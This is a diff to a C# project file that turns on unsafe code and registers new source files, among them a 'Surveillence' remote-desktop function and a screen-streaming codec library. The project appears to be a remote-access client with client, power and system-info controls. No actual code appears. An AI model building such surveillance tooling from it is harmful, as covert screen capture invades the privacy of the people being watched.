@@ -22,6 +22,7 @@
     <DefineConstants>DEBUG;TRACE</DefineConstants>
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
     <PlatformTarget>AnyCPU</PlatformTarget>
@@ -59,10 +60,18 @@
     <Compile Include="Networking\Functions\ClientControl.cs" />
     <Compile Include="Networking\Functions\General\GetSystemInfo.cs" />
     <Compile Include="Networking\Functions\PowerControl.cs" />
+    <Compile Include="Networking\Functions\Surveillence\RemoteDesktop.cs" />
     <Compile Include="Networking\Packet.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
     <Compile Include="Settings.cs" />
+    <Compile Include="StreamLibrary\Enums.cs" />
+    <Compile Include="StreamLibrary\IUnsafeCodec.cs" />
+    <Compile Include="StreamLibrary\IVideoCodec.cs" />
+    <Compile Include="StreamLibrary\src\JpgCompression.cs" />
+    <Compile Include="StreamLibrary\src\LzwCompression.cs" />
+    <Compile Include="StreamLibrary\src\NativeMethods.cs" />
+    <Compile Include="StreamLibrary\UnsafeCodecs\UnsafeStreamCodec.cs" />
     <EmbeddedResource Include="Properties\Resources.resx">
       <Generator>ResXFileCodeGenerator</Generator>
       <LastGenOutput>Resources.Designer.cs</LastGenOutput>
